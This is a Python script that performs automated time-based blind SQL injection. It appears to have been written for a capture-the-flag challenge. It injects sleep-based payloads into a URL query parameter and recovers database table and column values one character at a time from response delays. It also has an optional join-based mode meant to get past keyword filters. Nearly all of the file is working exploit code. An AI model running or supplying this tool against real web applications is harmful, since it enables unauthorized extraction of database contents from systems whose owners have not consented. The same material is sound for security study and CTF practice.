#!/bin/env python3
import requests
import time 
from string import printable
import re
import argparse
import sys

parser = argparse.ArgumentParser(description='Process some integers.')
parser.add_argument('--url',
                    default='http://localhost/?q=',
                    type=str,
                    help='Url with query set')
parser.add_argument('--table',
                    default='information_schema.columns',
                    type=str,
                    help='Table to bruteforce')
parser.add_argument('--column',
                    default='table_name',
                    type=str,
                    help='Column to bruteforce')
parser.add_argument('--where',
                    default='',
                    type=str,
                    help='Where additional arguments')
parser.add_argument('--slow',
                    default=1,
                    type=int,
                    help='Seconds to wait in the query for a found char, set higher if'
                         'there are false positives, lower if the query seems to slow')
parser.add_argument('--blacklist',
                    default=False,
                    type=bool,
                    help='True to use join instead of and false to use and, the join mode may cause problems')
parser.add_argument('--verbosity',
                    default=1,
                    type=int,
                    help='0 for results only'
                         '1 for verbose, shows trials'
                         '2 for debug, shows query text')
parser.add_argument('--charset',
                    default=printable,
                    type=str,
                    help='The charset to use to bruteforce')


args = parser.parse_args(sys.argv[1:])
charset=list(args.charset)

def remotebf(url,table,column,where="",pingAmpli=1,blacklistevader=False,verbosity=1):
    print("Working...")
    found=[]
    regex = re.compile('[^a-zA-Z]')
    t=0
    while(1):
        secret=[]
        last=""
        i=0
        while(1):
            for a in charset:
                before_request = time.time()
                if(blacklistevader):
                    prevRemover=(" ".join(["inner join (select 0)as "+regex.sub("",x)+" on "+column+"!='"+x+"' " for x in found]))
                    substr="binary substring("+column+",1,"+str(i+1)+")='"+("".join(secret)+a)+"' "+where+")=1"
                    queryInfo="from "+table+" "+prevRemover+" where "+substr
                else:
                    prevRemover=(" ".join([column+"!='"+x+"' and " for x in found]))
                    substr=" "+prevRemover+" binary substring("+column+",1,"+str(i+1)+")='"+("".join(secret)+a)+"' "+where+")=1"
                    queryInfo="from "+table+" where "+substr
                queryInj="' or (select sleep("+str(pingAmpli)+") "+queryInfo+"  -- "
                
                if(verbosity>=2):
                    print(queryInj)
                requests.get(url+queryInj)
                total_time = time.time()-before_request 

                if total_time > pingAmpli:
                    # match!
                    secret.append(a)
                    break
            i+=1###inc
            if("".join(secret)==last):
                found.append(last)
                break
            last="".join(secret)
            if(verbosity>=1):
                print("".join(secret))
        if(last==""):
            print(".:END:.")
            break
        t+=1###inc
    print("Values found:\n")
    for x in found:
        print(x)

try:
    #remotebf(url="http://filtered.challs.cyberchallenge.it/post.php?id=",table="information_schema.columns",column="table_name",where="",pingAmpli=2,verbosity=1)
    remotebf(args.url,args.table,args.column,args.where,args.slow,args.blacklist,args.verbosity)
except KeyboardInterrupt:
    pass